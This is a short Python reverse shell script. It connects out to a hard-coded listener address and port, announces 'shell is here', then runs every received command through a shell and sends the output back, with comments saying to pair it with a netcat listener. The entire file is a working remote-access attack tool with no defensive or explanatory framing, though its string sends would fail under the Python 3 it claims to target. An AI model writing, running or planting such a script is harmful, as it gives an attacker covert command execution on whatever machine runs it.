#!/usr/bin/python

# python 3
# nothing fancy, no shell prompt, lazy error handling
# use netcat listener

import socket
from subprocess import Popen,PIPE
from sys import exit

# listener host/port
HOST = '192.168.1.15' 
PORT = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect out, die on any error
try:
      s.connect((HOST, PORT))
except:
      exit()

# send success note
try:
      s.send('[!] ding dong, shell is here\n')
except:
      exit()

# take commands
while 1:
      try:
            # recieve
            data = s.recv(1024)
            # exec command
            proc = Popen(data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            # read & send back output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value)
      except:
            exit()
      
# close socket
try:
      s.close()
except:
      exit()
